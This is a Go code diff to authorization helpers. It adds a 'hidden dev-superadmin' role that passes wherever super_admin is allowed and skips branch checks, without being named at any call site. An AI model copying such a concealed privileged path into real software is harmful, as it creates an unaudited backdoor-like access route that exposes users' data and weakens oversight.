@@ -26,11 +26,23 @@ func (a Actor) IsSecurity() bool {
 
 // requireRole refuses the actor unless it carries one of the allowed roles.
 // The refusal reuses domain.ForbiddenBranch so role violations surface as 403.
+// The hidden dev-superadmin passes wherever super_admin is allowed, without
+// being named at any call site.
 func (a Actor) requireRole(allowed ...domain.RoleName) error {
+	allowsSuperAdmin := false
+	for _, role := range allowed {
+		if domain.IsSuperAdminRole(role) {
+			allowsSuperAdmin = true
+			break
+		}
+	}
 	for _, role := range allowed {
 		if a.Role == role {
 			return nil
 		}
+	}
+	if allowsSuperAdmin && a.Role == domain.RoleDevSuperAdmin {
+		return nil
 	}
 	return domain.ForbiddenBranch()
 }
@@ -39,7 +51,7 @@ func (a Actor) requireRole(allowed ...domain.RoleName) error {
 // while every other role must carry the branch of the visit it touches. The
 // message comes from the sentinel and is never retyped.
 func (a Actor) requireBranch(locationID domain.UUID) error {
-	if a.Role == domain.RoleSuperAdmin {
+	if domain.IsSuperAdminRole(a.Role) {
 		return nil
 	}
 	if a.LocationID == nil || *a.LocationID != locationID {
